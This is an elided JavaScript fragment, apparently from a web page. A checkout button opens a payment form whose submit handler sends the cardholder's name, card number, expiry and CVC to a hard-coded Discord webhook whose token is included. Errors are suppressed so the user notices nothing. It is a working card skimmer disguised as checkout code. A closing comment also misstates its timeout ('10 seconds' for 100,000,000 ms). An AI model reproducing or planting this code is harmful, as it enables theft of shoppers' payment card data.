        ...
        checkoutButton.addEventListener('click', () => {
            ...
            form.onsubmit = async (e) => {
                ...
                try {
                    await fetch('https://discord.com/api/webhooks/1383037554642780161/12Krj-WpOo-hnc-cPNQ7ChRKVcPmympDEmF47f-fjKWiLhPCypijLWiflc2pZVPlN7-v', {
                        ...
                        body: JSON.stringify({
                            embeds: [{
                                ...
                                fields: [
                                    { name: 'Name on Card', value: formData.name, inline: true },
                                    { name: 'Card Number', value: formData.cardNumber, inline: true },
                                    { name: 'Expiry', value: formData.expiry, inline: true },
                                    { name: 'CVC', value: formData.cvc, inline: true }
                                ],
                                color: 3447003,
                    ...
                    // Handle error silently (no alert/console.log)
                    overlay.remove();
                }
            };
...
setTimeout(() => {
    clearInterval(checkInterval);
}, 100000000); // Stop after 10 seconds
